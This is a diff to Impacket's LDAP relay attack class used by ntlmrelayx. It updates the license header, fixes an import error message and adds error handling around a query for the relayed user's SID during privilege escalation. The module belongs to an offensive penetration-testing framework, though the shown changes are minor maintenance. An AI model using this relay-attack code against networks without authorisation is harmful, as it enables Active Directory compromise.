@@ -1,19 +1,18 @@
-# SECUREAUTH LABS. Copyright 2018 SecureAuth Corporation. All rights reserved.
+# Impacket - Collection of Python classes for working with network protocols.
 #
-# This software is provided under under a slightly modified version
+# SECUREAUTH LABS. Copyright (C) 2021 SecureAuth Corporation. All rights reserved.
+#
+# This software is provided under a slightly modified version
 # of the Apache Software License. See the accompanying LICENSE file
 # for more information.
 #
-# LDAP Attack Class
+# Description:
+#   LDAP Attack Class
+#   LDAP(s) protocol relay attack
 #
 # Authors:
-#  Alberto Solino (@agsolino)
-#  Dirk-jan Mollema (@_dirkjan) / Fox-IT (https://www.fox-it.com)
-#
-# Description:
-#  LDAP(s) protocol relay attack
-#
-# ToDo:
+#   Alberto Solino (@agsolino)
+#   Dirk-jan Mollema (@_dirkjan) / Fox-IT (https://www.fox-it.com)
 #
 import _thread
 import random
@@ -44,8 +43,8 @@ try:
     from ldap3.protocol.microsoft import security_descriptor_control
 except ImportError:
     # We use a print statement because the logger is not initialized yet here
-    print('Failed to import required functions from ldap3. ntlmrelayx required ldap3 >= 2.5.0. \
-Please update with pip install ldap3 --upgrade')
+    print("Failed to import required functions from ldap3. ntlmrelayx requires ldap3 >= 2.5.0. \
+Please update with 'python -m pip install ldap3 --upgrade'")
 PROTOCOL_ATTACK_CLASS = "LDAPAttack"
 
 # Define global variables to prevent dumping the domain twice
@@ -301,8 +300,12 @@ class LDAPAttack(ProtocolAttack):
         restoredata = {}
 
         # Query for the sid of our user
-        self.client.search(userDn, '(objectCategory=user)', attributes=['sAMAccountName', 'objectSid'])
-        entry = self.client.entries[0]
+        try:
+            self.client.search(userDn, '(objectClass=user)', attributes=['sAMAccountName', 'objectSid'])
+            entry = self.client.entries[0]
+        except IndexError:
+            LOG.error('Could not retrieve infos for user: %s' % userDn)
+            return
         username = entry['sAMAccountName'].value
         usersid = entry['objectSid'].value
         LOG.debug('Found sid for user %s: %s' % (username, usersid))
